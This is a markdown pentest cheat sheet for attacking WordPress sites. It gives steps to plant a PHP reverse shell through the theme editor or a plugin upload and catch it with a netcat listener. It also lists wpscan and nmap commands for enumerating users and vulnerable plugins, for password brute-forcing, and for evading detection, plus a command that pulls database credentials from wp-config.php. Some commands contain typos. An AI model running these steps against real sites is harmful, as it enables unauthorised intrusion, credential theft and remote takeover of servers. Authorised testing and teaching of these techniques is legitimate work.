- [Wordpress](#Wordpress)
- [Drupal](#Drupal)
- []()

-----------------------------------------------------------------------------------------------------------------------------------------------
# Wordpress

### Revereshell via thames
- Log_in
- Side menu
- Appearance
  - Editor
  - 404.php
  - paste php reverse shell
- run nc -lnvp [port]

- Open /wp-content/themes/twentyfiftee(change for your thames name)/404.php

### ReverseShell via plugins
- Log_in
- Side menu
- Plugins
  - Add New
  - Add Plugin Browse
  - search file for example in /wp-content location
- run nc -lnvp [port]

### nmap scan
```
nmap -sV --script http-wordpress-enum <target>
nmap --script http-wordpress-enum --script-args check-latest=true,search-limit=10 <target>
nmap --script http-wordpress-enum --script-args type="themes" <target>
```
### wpscan

#### update wpscan 
- wpscan update

#### Scan
- wpscan --url https://[target_ip]
#### Vulnerable Plugins
- wpscan --url http://[victim_ip] --enumerate vp
- wpscan --url http://[victim_ip] --enumerate vp --plugins-detection aggressive
- wpscan --url http://[victim_ip] -e ap --plugins-detection aggressive
#### Vulnerable Themes
- wpscan --url http://[victim_ip] --enumerate vt
#### Enumerate Users
- wpscan --url http://[victim_ip] --enumerate u
#### Password Bruteforce
- wpscan --url http://[victim_ip] --passwords wordlist.txt --usernames xyz threads 50
#### Username Bruteforce
- wprscan --url http://[victim_ip] -U wordlist.txt 
#### All Plugins
- wpscan --url http://[victim_ip] --enumerate ap
#### All Themes
- wpscan --url http://[victim_ip] --enumerate vt
#### Database Exports
- wpscan --url http://[victim_ip] --enumerate dbe
#### Backups
- wpscan --url http://[victim_ip] --enumerate cb
##### Random User-Agent
- --random-user-agent
##### Avoid Detection(limited check)
- --stealthy
##### Disable SSL/TLS Security
- --disable-tls-checks
##### Disable Wordpress Detection
- --force
###### Docker pull the repo
- docker pull wpscanteam/wpscan
###### Docker Enumerate Usernames
- docker run -it --rm wpscanteam/wpscan --url
[victim_ip] --enumerate u
###### Get data from config file
- cat [/target/wp/path/wp-config.php |grep -E "DB_USER|DB_PASS"